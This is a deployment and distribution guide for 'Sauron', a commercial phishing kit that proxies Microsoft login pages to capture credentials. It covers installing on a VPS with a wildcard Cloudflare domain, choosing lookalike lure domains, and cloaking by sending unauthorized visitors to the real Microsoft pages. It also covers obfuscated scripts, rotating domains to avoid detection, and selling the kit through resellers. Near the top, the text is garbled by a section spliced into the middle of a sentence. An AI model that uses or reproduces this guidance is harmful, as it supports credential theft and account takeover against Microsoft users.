# Sauron Production Deployment Guide

This guide covers deploying Sauron without ex   **✅ NEW: Path-Agnostic Installation**

   ```text
   - Installation automatically detects current directory path
   - Works from any location: /root/sauron, /home/sauron, /opt/sauron, etc.
   - systemd service files dynamically configured for installation path
   - Certificate loading supports multiple fallback locations
   ```g source code, suitable for selling or distributing the system.

## 🎯 Deployment Options

### Option 1: Binary Release (Recommended)

- **Size**: ~16MB compressed
- **Security**: No source code exposed
- **Ease**: Simple installation script
- **Requirements**: Linux VPS only

### Option 2: Docker Release

- **Size**: ~100MB compressed
- **Security**: Containerized, no source code
- **Ease**: One-command deployment
- **Requirements**: Docker support

### Option 3: Automated Deployment

- **Process**: Fully automated via SSH
- **Security**: Direct VPS deployment
- **Ease**: Single command execution
- **Requirements**: SSH access to VPS

## 🔨 Building Release Packages

### Binary Release

```bash
# Build standard release
./scripts/build-release.sh v2.0.0

# Creates: release-v2.0.0/sauron-v2.0.0-linux-amd64.tar.gz
```

### Docker Release

```bash
# Build Docker release
./scripts/build-docker-release.sh v2.0.0

# Creates: docker-release-v2.0.0/sauron-v2.0.0.tar.gz
```

## 🚀 Deployment Methods

### Manual Binary Deployment

1. **Build and upload:**

   ```bash
   ./scripts/build-release.sh v2.0.0
   scp release-v2.0.0/sauron-v2.0.0-linux-amd64.tar.gz root@your-vps:/tmp/
   ```

2. **On VPS (Location-Agnostic Installation):**

   ```bash
   # Extract to any location - installation is path-agnostic
   cd /tmp
   tar -xzf sauron-v2.0.0-linux-amd64.tar.gz
   
   # Can install anywhere - examples:
   # Option 1: Root home directory
   mv sauron /root/sauron && cd /root/sauron
   
   # Option 2: Dedicated user directory  
   mv sauron /home/sauron/sauron && cd /home/sauron/sauron
   
   # Option 3: System directory
   mv sauron /opt/sauron && cd /opt/sauron
   
   # Configure settings
   cp .env.example .env
   nano .env  # Configure your settings
   
   # Install with automatic path detection
   sudo ./install-production.sh
   ```

   **✅ NEW: Path-Agnostic Installation**
   - Installation automatically detects current directory path
   - Works from any location: `/root/sauron`, `/home/sauron`, `/opt/sauron`, etc.
   - systemd service files dynamically configured for installation path
   - Certificate loading supports multiple fallback locations

### Docker Deployment

1. **Build and upload:**

   ```bash
   ./scripts/build-docker-release.sh v2.0.0
   scp -r docker-release-v2.0.0/ root@your-vps:/tmp/
   ```

2. **On VPS:**

   ```bash
   cd /tmp/docker-release-v2.0.0
   cp .env.example .env
   nano .env  # Configure your settings
   sudo ./deploy-docker.sh
   ```

### Automated Deployment

```bash
# One command deployment
./scripts/auto-deploy.sh 192.168.1.100 securelogin365.com your_cf_token
```

## ⚙️ Configuration Requirements

### Essential Environment Variables

```bash
# Your phishing domain
SAURON_DOMAIN=securelogin365.com

# Cloudflare API token for SSL certificates
CLOUDFLARE_API_TOKEN=your_token_here

# Cloudflare Turnstile secret
TURNSTILE_SECRET=your_turnstile_secret

# Admin panel access key
FIRESTORE_AUTH=your_secure_admin_key

# License token secret
LICENSE_TOKEN_SECRET=your_license_secret
```

### VPS Requirements

- **OS**: Ubuntu 20.04+ (64-bit)
- **RAM**: 2GB minimum, 4GB recommended
- **Storage**: 10GB minimum
- **Network**: Public IP with ports 80, 443, 53 open
- **Access**: Root SSH access

### Domain Requirements

- **Registration**: Domain must be registered and active
- **DNS**: Wildcard DNS pointing to VPS IP

  ```
  *.yourdomain.com → your_vps_ip
  yourdomain.com → your_vps_ip
  ```

- **Cloudflare**: Domain must use Cloudflare DNS

## 📦 What's Included in Release Packages

### Files Structure

```
sauron/
├── sauron                     # Main binary (35MB)
├── install-production.sh      # Installation script
├── verify-installation.sh     # Verification script
├── update-sauron.sh          # Update script
├── .env.example              # Configuration template
├── README.md                 # Deployment instructions
├── geo/GeoLite2-Country.mmdb # Geolocation database
├── data/slug_stats.json      # Default statistics
├── install/sauron.service    # systemd service file
└── config/serverConfig.json  # Server configuration
```

### Security Features

- **No source code**: Only compiled binary included
- **Obfuscated**: Scripts are encrypted and rotated
- **Certificates**: Automatic Let's Encrypt SSL
- **Monitoring**: Built-in health checks
- **Isolation**: Non-root execution (Docker)

## 🛡️ Security Best Practices

### Unauthorized Access Protection

**✅ NEW: Smart Redirect System**

Sauron now automatically protects against unauthorized access attempts:

- **Valid Access**: `https://login.yourdomain.com/c5299379-8d7f-451a-88c4-80c5e4e06c8c` ✅ Works normally
- **Invalid Access**: `https://login.yourdomain.com/` ❌ **Redirected to real Microsoft**
- **Base Domain**: `yourdomain.com` ❌ **Redirected to real Microsoft**

**How it Works:**

```bash
# Request without valid slug → Automatic redirect
curl -I https://login.yourdomain.com/
# Returns: HTTP/1.1 302 Found
# Location: https://login.microsoftonline.com/

# Request with valid slug → Normal proxy behavior  
curl -I https://login.yourdomain.com/valid-slug-here
# Returns: Normal Microsoft login page (proxied)
```

**Smart Redirects by Subdomain:**

- `outlook.*` → Redirects to `https://outlook.live.com/`
- `login.*` → Redirects to `https://login.microsoftonline.com/`
- `secure.*` → Redirects to `https://login.microsoftonline.com/`
- Other subdomains → Default Microsoft login

This makes unauthorized visitors think they hit real Microsoft servers!

### Domain Selection

❌ **Avoid:**

- Random strings: `ccfbb7b49107467d.zip`
- Suspicious TLDs: `.zip`, `.tk`, `.ml`
- Exact copies: `microsoft.com`

✅ **Use:**

- Professional: `securelogin365.com`
- Brand-similar: `authservice.com`
- Common TLDs: `.com`, `.net`, `.org`

### Operational Security

- **Rotate domains** regularly
- **Monitor logs** for detection patterns
- **Use staging** certificates for testing
- **Backup configurations** before updates
- **Limit admin access** to secure IPs

## 🔄 Management Commands

### Binary Deployment

```bash
# Check status
sudo systemctl status sauron

# View logs
sudo journalctl -u sauron -f

# Restart service
sudo systemctl restart sauron

# Verify installation
./verify-installation.sh

# Update binary
./update-sauron.sh
```

### Docker Deployment

```bash
# Manage services
./manage-sauron.sh start|stop|restart|logs|status

# Update containers
./manage-sauron.sh update

# Create backup
./manage-sauron.sh backup
```

## 🎁 Distribution Strategy

### For Clients/Customers

1. **Build release package** with their domain pre-configured
2. **Provide VPS setup guide** with their specific requirements
3. **Include support documentation** for common issues
4. **Offer remote installation** service for additional fee

### For Resellers

1. **Provide build scripts** for custom domains
2. **Include white-label documentation**
3. **Offer technical support** and updates
4. **License management** through built-in system

## 📞 Support Information

### Common Issues

- **Certificate failures**: Check Cloudflare API token
- **DNS resolution**: Verify wildcard DNS setup
- **Port conflicts**: Ensure ports 80/443/53 are available
- **Permission errors**: Run installation as root

### Monitoring

- **Health endpoint**: `https://yourdomain.com/health`
- **Admin panel**: `https://yourdomain.com/admin`
- **Log analysis**: Built-in log aggregation
- **Performance metrics**: Real-time statistics

---

**Note**: This deployment system ensures complete separation of source code from production deployment, making it ideal for commercial distribution while maintaining security and functionality.
